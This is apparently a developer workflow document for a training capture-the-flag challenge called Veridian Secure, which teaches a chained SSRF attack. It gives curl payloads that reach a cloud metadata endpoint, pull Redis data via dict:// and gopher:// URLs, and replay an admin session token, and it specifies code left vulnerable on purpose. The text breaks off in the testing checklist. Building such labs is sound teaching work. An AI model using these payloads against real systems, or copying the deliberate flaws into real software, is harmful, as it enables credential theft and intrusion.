# CTF6 Veridian Secure -- Workflow Document

This document is the complete design and implementation reference for CTF6. It contains everything a developer needs to build the challenge from scratch: narrative text, exploit walkthroughs, infrastructure specifications, flag generation logic, and testing procedures. No application code should be written without consulting this document first.

---

## 1. Challenge Overview

Veridian Secure is a four-flag, advanced-difficulty jeopardy CTF built around Server-Side Request Forgery (SSRF), classified as OWASP A10 (Server-Side Request Forgery). Players assume the role of an investigative journalist who has received leaked credentials to the internal web portal of a fictional Durham-based private security firm. The portal contains a "Link Previewer" feature with an unvalidated server-side URL fetch, which players exploit progressively: first to reach an internal cloud metadata service, then to enumerate internal network configuration, then to pivot into an unauthenticated Redis instance via alternative URL schemes, and finally to replay a cached admin session token for access to a restricted admin dashboard.

The challenge is designed to be harder than CTF4 (the current hardest challenge). It requires knowledge of SSRF techniques, cloud metadata abuse, URL scheme exploitation, and session replay attacks. Each flag builds on discoveries from the previous flag, forming a coherent exploit chain.

**Difficulty:** Advanced (harder than CTF4)
**Vulnerability class:** SSRF (OWASP A10)
**Flag count:** 4
**Flag format:** `durham-vsec-flagN{<token>_<username>}` where N = 1, 2, 3, 4
**Tech stack:** Rust (Actix-web), Python (Flask metadata mock), Redis 7, SQLite, Docker Compose
**Port:** 5180 (host) mapped to 8080 (container)

### Learning Objectives

- Understanding Server-Side Request Forgery and its impact
- Exploiting cloud metadata services (AWS IMDSv1 pattern)
- Enumerating internal network topology via SSRF
- Using alternative URL schemes (dict://) to interact with non-HTTP services
- Pivoting from information disclosure to session replay attacks
- Understanding why unauthenticated internal services are dangerous

---

## 2. Narrative Script

All story text is collected here. Each entry is labelled with its location in the application. A developer can change any of these strings without affecting exploit logic, provided the following rules are observed:

- The `/api/preview` endpoint URL must not change.
- The metadata paths (`/latest/meta-data/`, `/latest/user-data`) must not change.
- The Redis key names (`veridian:session:admin`, `veridian:flag3`, `veridian:incident:2024-03-15`) must not change.
- The `X-Session-Token` header name must not change.
- The `/admin` route path must not change.
- The `/health` route path must not change.

Everything else (character names, dates, organisation description, post body text, flavour text) is safe to modify.

### 2.1 Login Page Flavour Text

**Location:** `GET /login` -- rendered in the login page template

```
VERIDIAN SECURE -- Internal Operations Portal

Authorised personnel only. All access is logged and monitored.
Veridian Secure is a Durham-based private security and surveillance consultancy
providing threat assessment, executive protection, and intelligence analysis
services to corporate and government clients since 2011.

If you have received access credentials from your department head,
enter them below to proceed.
```

### 2.2 HTML Source Comments

**Location:** Login page HTML source

```html
<!-- Veridian Secure Portal v3.2.1 | Deployment: cloud-internal -->
<!-- service status: /health -->
```

**Location:** Dashboard page HTML source

```html
<!-- dashboard v3 | link preview tool available at /preview -->
```

**Location:** Preview page HTML source

```html
<!-- fetch endpoint: /api/preview -- no validation implemented yet, see issue #47 -->
<!-- preview accepts JSON body: {"url": "https://example.com"} -->
```

### 2.3 Health Endpoint JSON

**Location:** `GET /health` -- unauthenticated JSON response

```json
{
  "service": "Veridian Secure Portal",
  "version": "3.2.1",
  "status": "operational",
  "uptime": "running",
  "ssrf_note": "preview fetches are server-side, no allowlist configured",
  "internal_hint": "cloud metadata available at standard endpoint",
  "admin_route": "/admin",
  "changelog": "/static/CHANGELOG.md"
}
```

**Modifiable fields:** `service`, `version`, `uptime`. Do not remove `ssrf_note`, `internal_hint`, `admin_route`, or `changelog` as they are breadcrumbs.

### 2.4 Internal Blog Posts (visible after login on /dashboard)

**Post 1 -- "Infrastructure Migration Notes"**

```
Author: J. Harding, Systems Lead
Date: 2024-02-10

We have completed the migration to a cloud-hosted environment. All services
are now running on managed infrastructure. Note that during the transition
period, cloud metadata endpoints were left accessible from the application
tier for provisioning purposes. This will be locked down in Q3 once the
new IAM policy framework is approved.

For now, standard cloud metadata is reachable from any container on the
internal network.
```

**Post 2 -- "Tech Debt Register"**

```
Author: M. Torres, Engineering
Date: 2024-03-01

Current open items:

1. The link preview tool uses an HTTP client library that supports
   multiple URL schemes including dict:// and gopher://. We inherited
   this from the upstream dependency and have not yet restricted it to
   http/https only. Ticket VSEC-1134 tracks this.

2. Redis session store has no authentication configured. This was
   acceptable during development but needs to be addressed before the
   external audit in Q4.

3. The /admin dashboard checks only for a session token header.
   Full RBAC integration is deferred to the next sprint.
```

**Post 3 -- "Access Control Audit"**

```
Author: D. Chen, Security
Date: 2024-03-10

Preliminary findings from the internal access control review:

- Admin sessions are cached in the internal store for performance.
  Session tokens are passed as the X-Session-Token header.
- The current implementation does not validate token provenance.
  Any valid token string grants access.
- Recommendation: integrate with the central IAM service before
  the external audit deadline.

Status: DEFERRED (awaiting budget approval)
```

**Post 4 -- "Notice: Analyst K. Marsh"**

```
Author: HR Department
Date: 2024-03-16

It is with regret that we inform staff of the passing of senior
analyst Kieran Marsh on 15 March 2024. The official determination
is suicide. Counselling services are available through the
employee assistance programme.

All of Kieran's case files have been archived by the executive team.
Access requests should be directed to the COO's office.
```

### 2.5 CHANGELOG.md

**Location:** `GET /static/CHANGELOG.md`

See Section 10 (Implementation Checklist) for the full file content. The CHANGELOG is also a standalone deliverable file (`CTFs/CTF_6_veridian/CHANGELOG.md`). Key breadcrumb entries are:

```
[INFRA] Bootstrap script embedded in user-data for automated provisioning.
        Rotation of internal service addresses pending.
```

```
[SECURITY] Reminder: preview endpoint accepts any URL scheme.
           Ticket raised to restrict to http/https only. (unresolved)
```

### 2.6 Admin Dashboard Case File

**Location:** `GET /admin` -- rendered only when valid `X-Session-Token` header is present

```
CLASSIFIED -- INCIDENT REPORT 2024-03-15

Subject: Death of Senior Analyst Kieran Marsh

Summary:
On 15 March 2024, senior analyst Kieran Marsh was found dead at his
residence. The official verdict recorded by the coroner is suicide.
This report contains evidence that contradicts the official finding.

Findings:
- Marsh had compiled a dossier documenting illegal surveillance
  operations conducted by Veridian Secure against domestic targets
  without lawful authorisation.
- The dossier was scheduled for submission to the Information
  Commissioner's Office on 18 March 2024.
- CCTV footage from the Veridian office on 14 March shows COO
  Richard Hale accessing Marsh's workstation after hours and copying
  files to an external device.
- Marsh's personal mobile phone and laptop were not recovered from
  the scene, despite being logged as in his possession by building
  security at 17:45 on 14 March.

Conclusion:
The circumstances surrounding Kieran Marsh's death warrant formal
investigation. The suppression of this report was ordered by COO
Richard Hale on 16 March 2024.

Evidence token: durham-vsec-flag4{<per-user token>}

[END OF CLASSIFIED REPORT]
```

### 2.7 Metadata Service Responses

**Location:** Metadata mock server (internal only)

**GET /latest/meta-data/ response:**
```
iam/
iam/security-credentials/
iam/security-credentials/veridian-prod-role
```

**GET /latest/meta-data/iam/security-credentials/veridian-prod-role response:**
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "VRDNFAKEKEY01",
  "SecretAccessKey": "wJalrXUtnFEMI/FAKE/KEY",
  "Token": "durham-vsec-flag1{<per-user token>}",
  "Expiration": "2099-01-01T00:00:00Z"
}
```

**GET /latest/user-data response:**
```bash
#!/bin/bash
# Veridian Secure -- cloud bootstrap script
# Generated: 2024-01-15
# Environment: production-internal

# Service configuration
REDIS_HOST=redis
REDIS_PORT=6379
# internal session store -- no auth configured (legacy deployment)

APP_PORT=8080
APP_HOST=0.0.0.0

# Deployment credentials (rotate quarterly)
# DEPLOY_TOKEN=durham-vsec-flag2{<per-user token>}

echo "Bootstrapping Veridian Secure portal..."
echo "Connecting to Redis at $REDIS_HOST:$REDIS_PORT"
echo "Starting application on $APP_HOST:$APP_PORT"
```

### 2.8 Redis Seed Data

**Key: `veridian:session:admin`**
```
vsec-admin-sess-a1b2c3d4e5f6
```

**Key: `veridian:incident:2024-03-15`**
```
SUPPRESSED INCIDENT FRAGMENT: Analyst Marsh was in possession of
evidence documenting unauthorised surveillance operations. His death
on 15 March 2024 occurred three days before his scheduled disclosure
to the ICO. Case files sealed by executive order.
```

**Key: `veridian:flag3`**
```
durham-vsec-flag3{<per-user token>}
```

---

## 3. Exploit Walkthrough

### Prerequisite: Login

**Credentials:** Generated per-user via the challenge generation system. See `credentials.json`.

1. Navigate to `http://localhost:5180/`.
2. The app redirects to `/login`.
3. Enter the username and password from `credentials.json`.
4. On successful login, the app redirects to `/dashboard`.

### Flag 1 -- SSRF Discovery and Metadata Hit

**Objective:** Use the Link Previewer to reach the internal cloud metadata service and retrieve simulated IAM credentials.

**Discovery path:**

1. On `/dashboard`, read the blog posts. "Infrastructure Migration Notes" mentions cloud metadata endpoints are accessible from the internal network.
2. Navigate to `/preview` (the Link Previewer tool, linked from the dashboard or discoverable from HTML comments).
3. View page source on `/preview`. Find:
   ```html
   <!-- fetch endpoint: /api/preview -- no validation implemented yet, see issue #47 -->
   ```
4. View page source on `/login` or any page. Find:
   ```html
   <!-- service status: /health -->
   ```
5. Visit `http://localhost:5180/health`. The JSON response contains:
   ```json
   "ssrf_note": "preview fetches are server-side, no allowlist configured",
   "internal_hint": "cloud metadata available at standard endpoint"
   ```

**Exploit:**

Step 1: Submit the metadata base URL to the preview endpoint.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -H "Cookie: <session_cookie>" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

**Expected response:**
```
iam/
iam/security-credentials/
iam/security-credentials/veridian-prod-role
```

Step 2: Fetch the IAM credential.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -H "Cookie: <session_cookie>" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/veridian-prod-role"}'
```

**Expected response:**
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "VRDNFAKEKEY01",
  "SecretAccessKey": "wJalrXUtnFEMI/FAKE/KEY",
  "Token": "durham-vsec-flag1{<per-user token>}",
  "Expiration": "2099-01-01T00:00:00Z"
}
```

**Flag 1:** The `Token` field value: `durham-vsec-flag1{<token>_<username>}`

---

### Flag 2 -- Metadata Enumeration: Internal Network Disclosure

**Objective:** Enumerate the metadata service further to discover the cloud bootstrap script containing Redis connection details and Flag 2.

**Discovery path:**

1. The metadata directory listing from Flag 1 shows available paths. The player may notice this only covers `iam/` and wonder what else is available.
2. Visit `http://localhost:5180/static/CHANGELOG.md` (linked from the page footer or discoverable via `/health` JSON).
3. The CHANGELOG contains:
   ```
   [INFRA] Bootstrap script embedded in user-data for automated provisioning.
           Rotation of internal service addresses pending.
   ```
4. This hints that `/latest/user-data` contains useful configuration.

**Exploit:**

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -H "Cookie: <session_cookie>" \
  -d '{"url": "http://169.254.169.254/latest/user-data"}'
```

**Expected response:**
```bash
#!/bin/bash
# Veridian Secure -- cloud bootstrap script
# Generated: 2024-01-15
# Environment: production-internal

# Service configuration
REDIS_HOST=redis
REDIS_PORT=6379
# internal session store -- no auth configured (legacy deployment)

APP_PORT=8080
APP_HOST=0.0.0.0

# Deployment credentials (rotate quarterly)
# DEPLOY_TOKEN=durham-vsec-flag2{<per-user token>}

echo "Bootstrapping Veridian Secure portal..."
echo "Connecting to Redis at $REDIS_HOST:$REDIS_PORT"
echo "Starting application on $APP_HOST:$APP_PORT"
```

**Flag 2:** The `DEPLOY_TOKEN` comment value: `durham-vsec-flag2{<token>_<username>}`

---

### Flag 3 -- Redis Pivot via Alternative URL Scheme

**Objective:** Use the dict:// URL scheme through the SSRF to interact with the unauthenticated Redis instance and retrieve Flag 3.

**Discovery path:**

1. The bootstrap script from Flag 2 reveals `REDIS_HOST=redis` and `REDIS_PORT=6379`, with a comment confirming no authentication.
2. The CHANGELOG contains:
   ```
   [SECURITY] Reminder: preview endpoint accepts any URL scheme.
              Ticket raised to restrict to http/https only. (unresolved)
   ```
3. The "Tech Debt Register" blog post mentions:
   ```
   The link preview tool uses an HTTP client library that supports
   multiple URL schemes including dict:// and gopher://.
   ```
4. These breadcrumbs together indicate: non-HTTP schemes work in the preview endpoint, and Redis is reachable.

**Exploit:**

Step 1: Probe Redis to confirm connectivity.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -H "Cookie: <session_cookie>" \
  -d '{"url": "dict://redis:6379/INFO server"}'
```

**Expected response:** Redis server info output (version banner, uptime, etc.), confirming Redis is reachable.

Step 2: Enumerate Redis keys.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -H "Cookie: <session_cookie>" \
  -d '{"url": "dict://redis:6379/KEYS *"}'
```

**Expected response:** List of keys including:
```
veridian:session:admin
veridian:incident:2024-03-15
veridian:flag3
```

Step 3: Retrieve Flag 3.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -H "Cookie: <session_cookie>" \
  -d '{"url": "dict://redis:6379/GET veridian:flag3"}'
```

**Expected response:**
```
durham-vsec-flag3{<per-user token>}
```

**Flag 3:** `durham-vsec-flag3{<token>_<username>}`

**Alternative approach (gopher://):**

The gopher:// scheme allows sending raw TCP data, which is more powerful for Redis command injection. If the Actix-web HTTP client (reqwest) supports gopher:// natively:

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -H "Cookie: <session_cookie>" \
  -d '{"url": "gopher://redis:6379/_GET%20veridian:flag3%0D%0A"}'
```

**Implementation decision note:** The reqwest crate does not support dict:// or gopher:// natively. The Actix-web `/api/preview` handler must implement custom scheme handling. See Section 5 (Vulnerability Design Notes) for the recommended approach. If only one scheme can be supported, prefer dict:// as it is simpler to implement and sufficient for the exploit chain.

---

### Flag 4 -- Redis Session Replay and Admin Panel Access

**Objective:** Retrieve the cached admin session token from Redis and replay it to access the restricted admin dashboard.

**Discovery path:**

1. Redis key enumeration from Flag 3 reveals `veridian:session:admin`.
2. The "Access Control Audit" blog post states:
   ```
   Admin sessions are cached in the internal store for performance.
   Session tokens are passed as the X-Session-Token header.
   ```
3. The `/health` endpoint JSON includes `"admin_route": "/admin"`.

**Exploit:**

Step 1: Retrieve the admin session token from Redis.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -H "Cookie: <session_cookie>" \
  -d '{"url": "dict://redis:6379/GET veridian:session:admin"}'
```

**Expected response:**
```
vsec-admin-sess-a1b2c3d4e5f6
```

Step 2: Access the admin dashboard with the session token.

```bash
curl http://localhost:5180/admin \
  -H "X-Session-Token: vsec-admin-sess-a1b2c3d4e5f6"
```

**Expected response:** The admin dashboard HTML containing the classified incident report and Flag 4 embedded in the document body.

**Flag 4:** `durham-vsec-flag4{<token>_<username>}`

**Note:** The `/admin` route does not require a login session cookie. It checks only for the `X-Session-Token` header matching the value stored in Redis. This is the deliberate misconfiguration.

---

## 4. Infrastructure Diagram

```
                           HOST MACHINE
    +----------------------------------------------------------+
    |                                                          |
    |  Player Browser                                          |
    |       |                                                  |
    |       | http://localhost:5180                             |
    |       v                                                  |
    +------ | -------------------------------------------------+
            |
            | port 5180:8080
            |
    +------ | --- veridian-internal (Docker bridge network) ---+
    |       v                                                  |
    |  +-----------+                                           |
    |  |    app    |     Rust / Actix-web                      |
    |  |           |     Port 8080 (internal)                  |
    |  |           |     SQLite (embedded)                     |
    |  |           |     /api/preview (SSRF-vulnerable)        |
    |  +-----------+                                           |
    |       |                                                  |
    |       | HTTP (port 80)         | dict:// (port 6379)     |
    |       v                        v                         |
    |  +----------------+    +----------------+                |
    |  |   metadata     |    |     redis      |                |
    |  |                |    |                |                |
    |  | Python Flask   |    | Redis 7 alpine |                |
    |  | Port 80        |    | Port 6379      |                |
    |  | Hostname:       |    | Hostname: redis|                |
    |  | 169.254.169.254|    | No auth        |                |
    |  |                |    |                |                |
    |  | NOT exposed    |    | NOT exposed    |                |
    |  | on host        |    | on host        |                |
    |  +----------------+    +----------------+                |
    |                                                          |
    +----------------------------------------------------------+

    Legend:
    - Only the "app" service has a host port binding (5180:8080)
    - metadata and redis are reachable only from within the
      veridian-internal Docker network
    - The metadata service is assigned hostname 169.254.169.254
      via Docker network alias
    - The redis service is assigned hostname "redis"
```

---

## 5. Vulnerability Design Notes

### Flag 1 -- Unvalidated Server-Side URL Fetch

**Deliberate misconfiguration:** The `/api/preview` endpoint accepts any URL and fetches it server-side without validating the hostname or restricting to an allowlist. This allows the player to request internal network addresses including the metadata service at 169.254.169.254.

**Why it is realistic:** SSRF via URL preview/fetch features is one of the most common SSRF vectors in production applications. Many real-world applications (link previewers, webhook handlers, PDF generators) fetch user-supplied URLs without proper validation. The AWS metadata endpoint at 169.254.169.254 is the canonical SSRF target, exploited in the 2019 Capital One breach among others.

**Unintended solve paths and mitigations:**
- The player might try to access Redis directly via HTTP (http://redis:6379/). Redis responds to HTTP with an error, but this should not leak flag data. Mitigation: Redis protocol errors do not contain flag values.
- The player might try to scan the internal network for other services. Mitigation: Only the metadata and Redis services exist on the network. No other services contain flag data.

### Flag 2 -- Metadata User-Data Enumeration

**Deliberate misconfiguration:** The simulated cloud metadata service exposes a user-data endpoint containing a bootstrap script with hardcoded credentials (a common cloud misconfiguration). No IMDSv2 token requirement is enforced.

**Why it is realistic:** AWS IMDSv1 (the version simulated here) does not require a session token, making it trivially accessible via SSRF. Real-world cloud instances frequently have sensitive data in user-data scripts, including database credentials, API keys, and deployment tokens. AWS published guidance recommending IMDSv2 specifically because of this attack pattern.

**Unintended solve paths and mitigations:**
- The player might guess the user-data path without the CHANGELOG hint. This is acceptable as it follows standard cloud enumeration methodology and is considered a valid alternate discovery path.
- The player might try other metadata paths (e.g., /latest/meta-data/hostname). Mitigation: The metadata mock only implements the paths listed in Section 2.7. All other paths return 404.

### Flag 3 -- Alternative URL Scheme to Non-HTTP Service

**Deliberate misconfiguration:** The preview endpoint does not restrict URL schemes, allowing dict:// (and potentially gopher://) requests. Combined with an unauthenticated Redis instance on the same network, this allows the player to issue arbitrary Redis commands.

**Why it is realistic:** Many HTTP client libraries support multiple URL schemes by default. The dict:// protocol has been used in real-world SSRF exploits against Redis and Memcached instances. The combination of SSRF plus unauthenticated Redis is a well-documented attack pattern (see: Orange Tsai's SSRF research, various bug bounty reports).

**Unintended solve paths and mitigations:**
- The player might try to write to Redis (SET commands) to inject data. Mitigation: The exploit chain does not require writing; all needed data is pre-seeded. However, if the player does write data, it does not break the challenge for other players (single-tenant deployment).
- The player might try to use Redis CONFIG commands to write files to disk (the Redis RCE technique). Mitigation: Redis is running in the redis:7-alpine container with no write access to the app container's filesystem. Cross-container file writes are not possible.
- The player might try RESP protocol injection via HTTP headers. Mitigation: The preview endpoint sends the URL to reqwest/custom handler, not raw socket data via HTTP.

### Flag 4 -- Session Replay via Stolen Token

**Deliberate misconfiguration:** The `/admin` route validates access using only a static session token passed in the `X-Session-Token` header. There is no session binding, no IP validation, no CSRF protection, and no additional authentication check. The token is stored in unauthenticated Redis, readable via the SSRF chain.

**Why it is realistic:** Session token caching in Redis/Memcached without authentication is a common pattern in microservice architectures. Session replay attacks are a real threat when tokens are not bound to client identity. The X-Session-Token header pattern mimics API gateway session validation used in many production systems.

**Unintended solve paths and mitigations:**
- The player might try to brute-force the admin token. Mitigation: The token `vsec-admin-sess-a1b2c3d4e5f6` is 30 characters and not guessable.
- The player might try to access `/admin` with their regular login session cookie. Mitigation: The `/admin` route ignores login session cookies entirely; it checks only the `X-Session-Token` header.
- The player might try to find the admin token in the SQLite database. Mitigation: The admin token is stored only in Redis, not in SQLite.

---

## 6. Implementation Checklist

Ordered list of every file to create, grouped by component.

### Docker and Infrastructure

| # | File | Description |
|---|------|-------------|
| 1 | `CTFs/CTF_6_veridian/docker-compose.yml` | Docker Compose file defining app, metadata, and redis services on veridian-internal network |
| 2 | `CTFs/CTF_6_veridian/Dockerfile` | Multi-stage Dockerfile for the Rust/Actix-web main application |
| 3 | `CTFs/CTF_6_veridian/metadata/Dockerfile` | Dockerfile for the Python Flask metadata mock server |
| 4 | `CTFs/CTF_6_veridian/metadata/metadata_server.py` | Single-file Flask app implementing the cloud metadata mock |
| 5 | `CTFs/CTF_6_veridian/metadata/requirements.txt` | Python dependencies for the metadata server (flask) |
| 6 | `CTFs/CTF_6_veridian/redis/seed.sh` | Shell script to pre-seed Redis with session token, incident text, and flag3 |
| 7 | `CTFs/CTF_6_veridian/redis/Dockerfile` | Dockerfile for Redis that copies and runs the seed script on startup |

### Rust Application

| # | File | Description |
|---|------|-------------|
| 8 | `CTFs/CTF_6_veridian/Cargo.toml` | Rust project manifest with actix-web 4, reqwest (async), rusqlite, serde, serde_json dependencies |
| 9 | `CTFs/CTF_6_veridian/src/main.rs` | Application entry point: Actix-web server setup, route registration, SQLite init |
| 10 | `CTFs/CTF_6_veridian/src/routes.rs` | All route handlers: login, dashboard, preview page, api/preview, health, admin, static files |
| 11 | `CTFs/CTF_6_veridian/src/auth.rs` | Authentication middleware: session cookie validation, SQLite user lookup |
| 12 | `CTFs/CTF_6_veridian/src/preview.rs` | SSRF-vulnerable preview handler: URL fetch with no scheme/host restriction, custom dict:// handler |
| 13 | `CTFs/CTF_6_veridian/src/narrative.rs` | All narrative strings as constants (login text, blog posts, health JSON fields, admin case file) |
| 14 | `CTFs/CTF_6_veridian/src/db.rs` | SQLite database initialisation, user table creation, seed data insertion |
| 15 | `CTFs/CTF_6_veridian/src/models.rs` | Data structures: User, BlogPost, PreviewRequest, HealthResponse |
| 16 | `CTFs/CTF_6_veridian/templates/login.html` | Login page template with narrative flavour text and HTML comments |
| 17 | `CTFs/CTF_6_veridian/templates/dashboard.html` | Dashboard template showing blog posts and navigation |
| 18 | `CTFs/CTF_6_veridian/templates/preview.html` | Link Previewer UI with URL input form |
| 19 | `CTFs/CTF_6_veridian/templates/admin.html` | Admin dashboard with classified case file and Flag 4 |
| 20 | `CTFs/CTF_6_veridian/static/CHANGELOG.md` | In-game changelog with breadcrumb entries (also copied to CTFs/CTF_6_veridian/CHANGELOG.md) |

### Challenge Generation

| # | File | Description |
|---|------|-------------|
| 21 | `CTFs/challenge-generation/generators/ctf6_generator.js` | HMAC-SHA256 flag generator for all 4 flags, plus bootstrap script template renderer |
| 22 | `CTFs/challenge-generation/chgen_ctf6.js` | CLI wrapper for CTF6 flag generation |
| 23 | `CTFs/challenge-generation/package.json` | Updated with generate-flags-ctf6 script entry |

### Supporting Files

| # | File | Description |
|---|------|-------------|
| 24 | `CTFs/CTF_6_veridian/README.md` | Player-facing setup instructions |
| 25 | `CTFs/CTF_6_veridian/CHANGELOG.md` | Narrative changelog (in-game breadcrumb, also served as /static/CHANGELOG.md) |
| 26 | `CTFs/CTF_6_veridian/ctf-config.json` | Machine-readable challenge metadata |
| 27 | `CTFs/CTF_6_veridian/SOLUTIONS.md` | Complete solution guide for instructors/markers |
| 28 | `CTFs/CTF_6_veridian/.env.example` | Example environment file with placeholder values |
| 29 | `CTFs/CTF_6_veridian/workflow.md` | This document |

---

## 7. Flag Generation Reference

### HMAC Key Derivation Scheme

All four flags use HMAC-SHA256 with a base salt and a per-flag suffix. The scheme matches the pattern established in CTF5 (`ctf5_generator.js`).

**Base salt:** `veridian-ctf6-2026`
**Per-flag HMAC keys:**

| Flag | HMAC Key (used as `key` parameter to HMAC-SHA256) |
|------|----------------------------------------------------|
| 1 | `veridian-ctf6-2026-flag1` |
| 2 | `veridian-ctf6-2026-flag2` |
| 3 | `veridian-ctf6-2026-flag3` |
| 4 | `veridian-ctf6-2026-flag4` |

**Token generation process:**

```
input    = lowercase(trim(username))
hmac_key = "veridian-ctf6-2026-flagN"  (where N is the flag number)
token    = HMAC-SHA256(key=hmac_key, data=input).hex().slice(0, 20)
flag     = "durham-vsec-flagN{" + token + "_" + input + "}"
```

**Flag format:** `durham-vsec-flagN{<20-hex-char-token>_<username>}`

### Example Output for Username `abcd12`

Using Node.js crypto:

```javascript
const crypto = require('crypto')
const salt = 'veridian-ctf6-2026'
const username = 'abcd12'

function generateFlag(user, flagNum) {
  const token = crypto
    .createHmac('sha256', `${salt}-flag${flagNum}`)
    .update(user)
    .digest('hex')
    .slice(0, 20)
  return `durham-vsec-flag${flagNum}{${token}_${user}}`
}

console.log(generateFlag(username, 1))
console.log(generateFlag(username, 2))
console.log(generateFlag(username, 3))
console.log(generateFlag(username, 4))
```

Expected output (deterministic):

```
durham-vsec-flag1{<20-hex-chars>_abcd12}
durham-vsec-flag2{<20-hex-chars>_abcd12}
durham-vsec-flag3{<20-hex-chars>_abcd12}
durham-vsec-flag4{<20-hex-chars>_abcd12}
```

(Exact hex values are deterministic and can be verified by running the generator.)

### Bootstrap Script Template

The CTF6 generator must also produce the complete bootstrap script (user-data response) with Flag 2 interpolated. The generator function `generateBootstrapScript(username)` returns the full script text from Section 2.7 with `durham-vsec-flag2{<token>_<username>}` substituted into the `DEPLOY_TOKEN` line.

### Generator Module Exports

`ctf6_generator.js` must export:

```javascript
module.exports = {
  generateFlag,          // (username, flagNum) => flag string
  generateUserFlags,     // (username) => { flag1, flag2, flag3, flag4 }
  generateFlags,         // (usernames[]) => { username: { flag1..flag4 } }
  generateCredentials,   // (usernames[]) => { username: { password, role } }
  generateBootstrapScript, // (username) => full bootstrap script string with flag2
  FLAG_PREFIX,           // 'durham-vsec'
}
```

### CLI Wrapper Interface

`chgen_ctf6.js` follows the same interface as `chgen_ctf5.js`:

```
Usage:
  node chgen_ctf6.js abcd12 efgh34 ijkl56    # Specify player usernames
  node chgen_ctf6.js --count 10               # Generate 10 random players
```

Output files:
- `CTFs/CTF_6_veridian/flags.json` -- per-user flag mapping
- `CTFs/CTF_6_veridian/credentials.json` -- per-user login credentials

The `credentials.json` format matches CTF5:

```json
{
  "abcd12": {
    "password": "<random-base64-string>",
    "role": "analyst"
  }
}
```

(Role is "analyst" instead of "editor" to match the Veridian narrative.)

### package.json Update

Add to the `scripts` section:

```json
"generate-flags-ctf6": "node chgen_ctf6.js"
```

Update the combined `generate-flags` script to include `npm run generate-flags-ctf6`.

---

## 8. Unintended Vulnerability Audit

Following the format established in CTF4.

### V1 -- Direct Redis Access from Host

**Risk:** If Redis port 6379 is accidentally exposed on the host, a player could connect to Redis directly without needing the SSRF chain, bypassing Flags 1 and 2 entirely.

**Mitigation:** The `docker-compose.yml` must not map Redis ports to the host. The Redis service definition must have no `ports:` directive. Verify with `docker compose ps` that Redis shows no host port binding.

### V2 -- Direct Metadata Access from Host

**Risk:** If the metadata service port 80 is accidentally exposed on the host, a player could fetch metadata directly, bypassing the SSRF vulnerability entirely.

**Mitigation:** The metadata service definition must have no `ports:` directive. The hostname alias 169.254.169.254 is only resolvable within the Docker network. Verify that `curl http://169.254.169.254/latest/meta-data/` from the host machine fails.

### V3 -- Admin Token Brute Force

**Risk:** A player might attempt to brute-force the `X-Session-Token` header value for the `/admin` route, skipping the Redis enumeration (Flags 3 and 4).

**Mitigation:** The admin token `vsec-admin-sess-a1b2c3d4e5f6` is 30 characters (alphanumeric plus hyphens), making brute force infeasible. Optionally, implement rate limiting on the `/admin` route (e.g., 10 requests per minute per IP). The rate limiter should return 429 Too Many Requests.

### V4 -- SQLite Database File Access via SSRF

**Risk:** A player might try to use the SSRF to read the SQLite database file from the app container's filesystem via file:// scheme (e.g., `file:///app/data/veridian.db`).

**Mitigation:** The reqwest crate does not support the file:// scheme by default. The custom dict:// handler in the preview module must not implement file:// support. Explicitly reject file:// URLs in the preview handler with a generic error message (do not reveal that scheme filtering exists, as this would hint at the dict:// allowance).

### V5 -- HTTP Request to Redis Port

**Risk:** A player might send `http://redis:6379/` through the preview endpoint. Redis responds to HTTP requests with a protocol error that might leak information.

**Mitigation:** Redis protocol errors contain only the error message (e.g., `-ERR wrong number of arguments`), not key data. The preview handler returns whatever the server responds with. This does confirm Redis is running but does not leak flag values. This is an acceptable information leak that supports the intended discovery path.

### V6 -- DNS Rebinding

**Risk:** A player might use DNS rebinding to bypass hypothetical hostname validation (e.g., a domain that resolves to 169.254.169.254).

**Mitigation:** No hostname validation is implemented (the vulnerability is intentional), so DNS rebinding is not relevant. This is noted for completeness in case hostname validation is added in a future hardened version.

### V7 -- Session Cookie Theft via SSRF

**Risk:** A player might attempt to use the SSRF to make requests to the app itself (e.g., `http://localhost:8080/admin`) to access admin routes from the server side.

**Mitigation:** The SSRF to localhost:8080 would reach the app itself, but the request would lack the `X-Session-Token` header (the player controls only the URL, not the headers of the SSRF request). The `/admin` route checks for the header, so this path does not work. However, document this clearly: the preview handler must not forward any of the player's request headers (especially cookies or custom headers) to the fetched URL.

### V8 -- Redis SLAVEOF / REPLICAOF Command Injection

**Risk:** A player might use dict:// to issue `SLAVEOF` or `REPLICAOF` commands to exfiltrate all Redis data to an external server they control.

**Mitigation:** In a CTF context, this is acceptable (the player already has SSRF access to Redis). The challenge is single-tenant, so there is no risk to other players. For additional hardening, the Redis configuration could disable these commands via `rename-command SLAVEOF ""` in redis.conf, but this is optional.

---

## 9. Testing Checklist

Manual verification steps to confirm each flag is reachable via the intended path and not via unintended paths.

### Infrastructure Tests

- [ ] `docker compose up --build` starts all three services without errors.
- [ ] `docker compose ps` shows app with port 5180:8080, metadata with no host port, redis with no host port.
- [ ] `curl http://localhost:5180/` returns a redirect to `/login` (HTTP 302).
- [ ] `curl http://localhost:5180/health` returns the JSON health response with all breadcrumb fields.
- [ ] `curl http://169.254.169.254/latest/meta-data/` from the host machine fails (connection refused or timeout).
- [ ] `redis-cli -h localhost -p 6379` from the host machine fails (connection refused).

### Authentication Tests

- [ ] Login with valid credentials from `credentials.json` succeeds and redirects to `/dashboard`.
- [ ] Login with invalid credentials shows an error message.
- [ ] Accessing `/dashboard` without login redirects to `/login`.
- [ ] Accessing `/preview` without login redirects to `/login`.
- [ ] Accessing `/api/preview` without login returns 401 Unauthorized.
- [ ] Accessing `/health` without login succeeds (unauthenticated endpoint).

### Flag 1 Tests

- [ ] After login, view page source on `/preview` shows the HTML comment referencing `/api/preview` and issue #47.
